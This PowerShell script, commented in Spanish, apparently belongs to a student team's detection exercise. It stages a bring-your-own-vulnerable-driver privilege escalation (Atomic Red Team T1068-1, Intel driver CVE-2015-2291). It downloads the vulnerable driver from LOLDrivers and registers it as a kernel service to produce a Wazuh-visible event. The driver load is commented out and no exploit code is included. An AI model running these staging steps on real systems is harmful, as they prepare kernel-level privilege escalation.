# T1068 - Exploitation for Privilege Escalation (Windows, ataque interno / insider)
# Tecnica de referencia: Scattered Spider BYOVD (CVE-2015-2291, driver de diagnostico Intel)
# Fuente del atomic test: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/T1068.yaml (test T1068-1)
#
# DECISION DEL EQUIPO (02/11/2026): no se ejecuta la carga real del driver vulnerable
# (`sc.exe start`) en la VM compartida del equipo. Cargar un driver de kernel
# genuinamente vulnerable en una maquina que el equipo necesita para la entrega,
# dias antes de la fecha limite, se considero un riesgo innecesario: puede provocar
# inestabilidad/BSOD o un bloqueo impredecible por el driver-blocklist de Windows
# (HVCI/WDAC), y la recuperacion podria requerir un reinicio que nadie mas espera.
#
# Lo que SI es seguro y SI se deja listo para ejecutar en vivo (por ejemplo durante
# la defensa oral) es el registro del servicio de kernel con `sc.exe create`: esto
# unicamente escribe una entrada en el registro (HKLM\SYSTEM\CurrentControlSet\Services)
# sin invocar el DriverEntry del .sys, es decir, sin cargar nada en memoria del kernel.
# Aun asi genera un evento real y detectable (Service Control Manager, Event ID 7045,
# "A new service was installed"), que es justamente el tipo de evidencia que Wazuh
# deberia poder recoger.
#
# NOTA IMPORTANTE: la cuenta usada para administrar esta VM por SSH (juanc) ya tiene
# privilegios de Administrator local. Para que la demo sea fiel a la narrativa "insider
# con cuenta de bajo privilegio" (ver agent-windows-insider/README.md, paso 1), hay que
# correr este script desde una cuenta SIN privilegios de administrador, y dejar que
# Windows pida elevacion (UAC) justo en el paso de `sc.exe create` -- no antes.
#
# El archivo .sys descargado es un driver legitimo firmado por Intel (no es malware);
# la vulnerabilidad es un IOCTL que permite lectura/escritura arbitraria de memoria,
# catalogada en el proyecto LOLDrivers.

$driverPath = "C:\AtomicRedTeam\ExternalPayloads\iqvw64e.sys"
$driverUrl  = "https://github.com/magicsword-io/LOLDrivers/blob/main/drivers/c796a92a66ec725b7b7febbdc13dc69b.bin?raw=true"

# ============================================================
# PARTE SEGURA (staging) -- esto es lo que se puede correr en vivo
# ============================================================

Write-Host "=== T1068 BYOVD - staging unicamente (sin sc.exe start) ===" -ForegroundColor Cyan

# 1. Descargar el driver vulnerable si no esta ya en cache local
if (-not (Test-Path $driverPath)) {
    New-Item -Type Directory (Split-Path $driverPath) -ErrorAction Ignore -Force | Out-Null
    Write-Host "Descargando driver desde LOLDrivers..."
    Invoke-WebRequest -Uri $driverUrl -OutFile $driverPath -UseBasicParsing
} else {
    Write-Host "Driver ya en cache: $driverPath"
}

# 2. Registrar el servicio de kernel (NO lo inicia)
Write-Host "Registrando servicio de kernel (sc.exe create, sin start)..."
sc.exe create iqvw64e.sys binPath= "$driverPath" type= kernel
sc.exe query iqvw64e.sys

# 3. Revisar el evento generado (Service Control Manager, 7045) para la evidencia
#    (pequena espera porque el EventLog tarda un instante en indexar el evento recien escrito)
Start-Sleep -Seconds 2
Write-Host "Evento generado (Event ID 7045):"
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 1 |
    Format-List TimeCreated, Id, Message

# 4. Limpieza del registro del servicio (se deja el .sys en cache para una demo rapida despues)
Write-Host "Limpiando el registro del servicio (sc.exe delete)..."
sc.exe delete iqvw64e.sys

Write-Host "=== Fin de la parte segura. El driver queda en cache, el servicio NO queda registrado. ===" -ForegroundColor Cyan

# ============================================================
# RESTO DEL ATAQUE -- NO EJECUTAR en la VM compartida del equipo.
# Comentado a proposito. Esto es lo que de verdad carga el driver
# vulnerable en el kernel y abre la superficie de explotacion real.
# ============================================================

# sc.exe create iqvw64e.sys binPath= "$driverPath" type= kernel
# sc.exe start iqvw64e.sys
#
# <<< Aqui iria el exploit real de CVE-2015-2291 contra el dispositivo \\.\Nal
#     (IOCTL que permite leer/escribir memoria fisica arbitraria del kernel)
#     para escalar hasta NT AUTHORITY\SYSTEM. Atomic Red Team no incluye el
#     exploit en si -- el atomic test solo demuestra el paso de "obtener y
#     cargar el driver vulnerable" (la parte de BYOVD), no la explotacion
#     completa del IOCTL. >>>
#
# sc.exe stop iqvw64e.sys
# sc.exe delete iqvw64e.sys
# Remove-Item -Recurse $driverPath -ErrorAction Ignore
